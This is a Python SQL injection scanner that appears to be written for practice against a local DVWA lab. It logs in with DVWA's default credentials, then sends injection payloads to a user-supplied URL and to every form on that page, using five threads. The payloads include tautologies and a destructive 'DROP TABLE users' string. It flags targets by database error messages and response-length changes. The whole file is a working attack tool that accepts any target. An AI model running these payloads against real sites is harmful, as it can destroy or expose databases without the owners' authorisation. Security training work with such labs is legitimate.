import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
import time
import json

#SQL Injection Payloads
payloads = [
    "'",
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "\" OR \"1\"=\"1",
    "' OR 'a'='a",
    "'; DROP TABLE users; --"
]

# SQL Error Messages
errors = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax error"
]

results = []

s = requests.Session()
headers = {
    "User-Agent": "Mozilla/5.0"
}
s.headers = headers

'''
______________________________________________________________________________________________
                SQL Injection (Forms & URL Injection)
'''

# Function :: Get all forms from a URL
def get_forms(url):
    response = s.get(url, headers=headers)
    soup = BeautifulSoup(response.content, "html.parser")
    return soup.find_all("form")

# Function :: Extract details from a form
def form_details(form):
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    
    inputs = []
    for input_tag in form.find_all("input"):
        
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        
        inputs.append({
            "type": input_type,
            "name": input_name,
            "value": input_value
        })
    
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    
    return details

# Function :: Test a form with Payloads
def test_form(url, form):
    details = form_details(form)
    original_response = s.get(url, headers=headers)
    original_length = len(original_response.text)
    
    for payload in payloads:
        data = {}
        
        for input_tag in details["inputs"]:
            if input_tag["type"] == "hidden" or input_tag["value"]:
                data[input_tag["name"]] = input_tag["value"] + payload
            elif input_tag["type"] != "submit":
                data[input_tag["name"]] = f"test {payload}"
        
        target = urllib.parse.urljoin(url, details["action"])
        if details["method"] == "post":
            response = s.post(target, data=data, headers=headers)
        else:
            response = s.get(target, params=data, headers=headers)

        found = False
        
        for error in errors:
            if error in response.text.lower():
                print(f"[VULNERABLE] Payload: {payload} | URL: {url}")
                
                results.append({
                    "url": url,
                    "payload": payload,
                    "type": "form",
                    "status": "vulnerable"
                })
                found = True
                break
        
        if not found:
            if len(response.text) != original_length:
                print(f"[POSSIBLE VULNERABILITY - FORM] Payload: {payload}")
                results.append({
                    "url": url,
                    "payload": payload,
                    "type": "form",
                    "status": "possible_vulnerability"
                })
                continue

            print(f"[SAFE] Payload: {payload} | URL: {url}")
            
            results.append({
                    "url": url,
                    "payload": payload,
                    "type": "form",
                    "status": "safe"
                })
        
#------------------------------------------------------------------------------------------------

# Function :: Test a URL with Payloads
def test_payload(url, payload):
    encoded_payload = urllib.parse.quote(payload)
    test_url = url + encoded_payload
    oriinal_response = s.get(url, headers=headers)
    original_length = len(oriinal_response.text)

    try:
        response = s.get(test_url, headers=headers, timeout = 5)
        found = False
        for error in errors:
            if error in response.text.lower():
                print(f"[VULNERABLE] Paylaod: {payload} | URL: {test_url}")

                results.append({
                    "url": test_url,
                    "payload": payload,
                    "type": "url",
                    "status": "vulnerable"
                })
                found = True              
                break
        
        if not found:
            if len(response.text) != original_length:
                print(f"[POSSIBLY VULNERABLE] Payload: {payload} | URL: {test_url}")
                
                results.append({
                    "url": test_url,
                    "payload": payload,
                    "type": "url",
                    "status": "possibly vulnerable"
                })
                return
            
            print(f"[SAFE] Payload: {payload} | URL: {test_url}")
            results.append({
                    "url": test_url,
                    "payload": payload,
                    "type": "url",
                    "status": "safe"
                })

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Request failed for {test_url}: {e}")

    time.sleep(1)


'''
_____________________________________________________________________________________
                        Main Function
'''
# Function :: Login to DVWA
def dvwa_login():
    login_url = "http://localhost/DVWA/login.php"
    
    login_data = {
        "username": "admin",
        "password": "password",
        "Login": "Login"
    }
    s.post(login_url, data=login_data)
    print("[+] Logged into DVWA")


# Main Function
def main():
    dvwa_login()

    #   http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit
    url = input("Enter Target URL: ")  
    print("\nStarting Scan...\n")

    with ThreadPoolExecutor(max_workers=5) as executor:
        for payload in payloads:
            executor.submit(test_payload, url, payload)

    forms = get_forms(url)
    print(f"\n[+] Detected {len(forms)} forms on {url}\n") 

    for form in forms:
        test_form(url, form)       
    
    with open("results.json", "w") as f:
        json.dump(results, f, indent=4)

    print("\nScan Completed. Results saved to results.json")
    

# Entry Point
if __name__ == "__main__":
    main()


